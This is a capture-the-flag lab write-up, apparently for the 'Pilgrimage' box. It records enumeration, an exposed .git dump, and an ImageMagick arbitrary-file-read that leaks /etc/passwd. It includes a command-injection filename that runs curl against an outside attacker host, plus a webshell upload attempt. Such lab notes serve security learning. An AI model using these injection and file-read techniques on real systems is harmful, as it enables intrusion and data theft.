### inital enumeration

nmap results

Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http


it has a website

![](20230722182338.png)

it has a register page

its php

so lets go dirb, gobuster

gobuster dir --url http://pilgrimage.htb --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html

gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://pilgrimage.htb -t 50 --append-domain

nothing on the subdomain enumeration

### content upload

all shrunk pictures come on the dashboard

where pictures are stored bu there is no lfi here

![](20230722183802.png)

lets try and load a php webshell
there is content restriction it seems

php change did not work


tried to forge  php shell across

![](20230722185519.png)


### other things on website?

and there are other pathways available

/index.php            (Status: 200) [Size: 7621]
/.html                (Status: 403) [Size: 153]
/login.php            (Status: 200) [Size: 6166]
/register.php         (Status: 200) [Size: 6173]
/assets               (Status: 301) [Size: 169] [--> http://pilgrimage.htb/assets/]
/logout.php           (Status: 302) [Size: 0] [--> /]
/vendor               (Status: 301) [Size: 169] [--> http://pilgrimage.htb/vendor/]
/dashboard.php        (Status: 302) [Size: 0] [--> /login.php]
/tmp                  (Status: 301) [Size: 169] [--> http://pilgrimage.htb/tmp/]

but all of them are forbidden now

### git

also just through drib found that .git repo is also available here

![](20230722184304.png)

but HEAD does not mention much

pip install git-dumper

git-dumper URL DIR

using git-dumper.py

was able to get the source code of the entire thing!

now need to go thorugh the code of the github

emily@pilgrimage.htb>

`exec("/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/" . $upload->getName() . $mime . " -resize 50% /var/www/pilgrimage.htb/shrunk/" . $newname . $mime);

`
this is the function calling it

can we add something in the name itself to make it execute?

"new|curl http://10.10.16.47:8000/iamcurling;".png

![](20230723101916.png)


IMageMagick library has an arbitrary file read vulnerability

and rce .

tested rce did not work

let check out arbitrary file read

after using the magick_exploit.py get the resultant file and usin 

convert downloaded_image.png result.png

identify -verbose result.png

(~)>>> python3 -c 'print(bytes.fromhex("726f6f743a783a726f6f743---REDACTED--").decode("utf-8"))'


root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin

![](20230723122440.png)

this works

so we have arbitrary file read



